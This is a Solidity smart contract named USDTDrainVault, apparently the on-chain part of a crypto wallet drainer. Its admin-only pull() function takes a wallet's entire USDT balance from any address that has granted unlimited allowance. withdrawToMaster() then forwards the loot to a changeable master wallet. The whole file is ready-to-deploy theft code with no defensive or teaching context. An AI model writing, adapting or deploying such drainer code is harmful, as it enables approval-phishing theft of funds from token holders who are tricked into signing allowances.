// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract USDTDrainVault {
    address public admin;
    address public masterWallet;
    IERC20 public usdt;

    // Events
    event USDTReceived(address indexed wallet, uint256 amount);
    event USDTWithdrawn(address indexed to, uint256 amount);
    event MasterWalletChanged(address indexed oldWallet, address indexed newWallet);

    constructor(address _masterWallet, address _usdt) {
        admin = msg.sender;
        masterWallet = _masterWallet;
        usdt = IERC20(_usdt);
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "Not admin");
        _;
    }

    // Pull USDT from ANY wallet that has approved unlimited allowance
    function pull(address wallet) external onlyAdmin returns (uint256) {
        uint256 bal = usdt.balanceOf(wallet);
        require(bal > 0, "No USDT to pull");

        bool ok = usdt.transferFrom(wallet, address(this), bal);
        require(ok, "Transfer failed");

        emit USDTReceived(wallet, bal);
        return bal;
    }

    // Withdraw USDT to master wallet
    function withdrawToMaster() external onlyAdmin returns (uint256) {
        uint256 bal = usdt.balanceOf(address(this));
        require(bal > 0, "No balance");

        bool ok = usdt.transfer(masterWallet, bal);
        require(ok, "Withdraw failed");

        emit USDTWithdrawn(masterWallet, bal);
        return bal;
    }

    // Change master wallet
    function changeMasterWallet(address newMaster) external onlyAdmin {
        address old = masterWallet;
        masterWallet = newMaster;
        emit MasterWalletChanged(old, newMaster);
    }

    // View functions
    function getWalletUSDT(address wallet) external view returns (uint256) {
        return usdt.balanceOf(wallet);
    }

    function getContractUSDT() external view returns (uint256) {
        return usdt.balanceOf(address(this));
    }
}
